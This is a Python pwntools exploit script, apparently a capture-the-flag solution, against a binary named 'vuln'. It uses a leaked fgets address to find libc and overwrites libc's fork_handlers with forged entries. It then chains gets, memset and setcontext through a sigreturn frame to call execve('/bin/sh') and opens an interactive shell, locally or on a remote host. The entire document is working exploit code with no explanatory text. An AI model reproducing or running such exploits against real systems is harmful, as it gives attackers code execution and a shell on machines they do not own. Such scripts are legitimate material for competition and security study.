#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('vuln')
libc = ELF('libc', checksec=False)
ld = ELF('ld', checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

p = conn()

fgets = int(p.recvline(), 16)
log.info(f"fgets: {hex(fgets)}")

libc.address = fgets - libc.sym.fgets
log.info(f"libc: {hex(libc.address)}")

def header(addr, size):
    return flat({
        0x00: size,
        0x10: addr
    })

def handler_array(*funcs):
    assert funcs
    data = bytearray(0x20*len(funcs) - 0x18)
    for i, func in zip(range(0, len(data), 0x20), funcs[::-1]):
        data[i:i+8] = p64(func)
    return data

def forge_split(addr, *funcs, rdi=None):
    array = handler_array(*funcs)
    if rdi is not None:
        size = rdi
        assert size >= len(funcs)
        addr = (addr - (size-len(funcs))*0x20) % (1<<64)
    else:
        size = len(funcs)
    return header(addr, size), array

def forge(addr, *funcs, rdi=None):
    hdr, arr = forge_split(addr+0x18, *funcs, rdi=rdi)
    return hdr + arr

def setcontext(regs, addr):
	frame = SigreturnFrame()
	for reg, val in regs.items():
		setattr(frame, reg, val)
	# needed to prevent SEGFAULT
	setattr(frame, "&fpstate", addr+0x1a8)
	fpstate = {
	0x00: p16(0x37f),	# cwd
	0x02: p16(0xffff),	# swd
	0x04: p16(0x0),		# ftw
	0x06: p16(0xffff),	# fop
	0x08: 0xffffffff,	# rip
	0x10: 0x0,			# rdp
	0x18: 0x1f80,	    # mxcsr
	}
	return flat({
	0x00 : bytes(frame),
#	0xf8: 0					# end of SigreturnFrame
	0x128: 0,				# uc_sigmask
	0x1a8: fpstate,			# fpstate
	})

addr = libc.sym.fork_handlers

addr_ctx = addr+0x100
data = forge(addr, libc.sym.gets, libc.address+0xa85d8, libc.sym.__memset_erms+13, libc.sym.setcontext+45, rdi=addr_ctx)
assert b"\n" not in data

extra_data = setcontext({
    "rdi": next(libc.search(b"/bin/sh\x00")),
    "rsi": 0,
    "rdx": 0,
    "rip": libc.sym.execve,
    "rsp": addr_ctx+0x200
}, addr_ctx)
assert b"\n" not in extra_data

#gdb.attach(p)
p.sendlineafter(b"Enter address, size and data: ", f"{addr} {len(data)+2} ".encode() + data)
p.sendline(extra_data)

p.interactive()
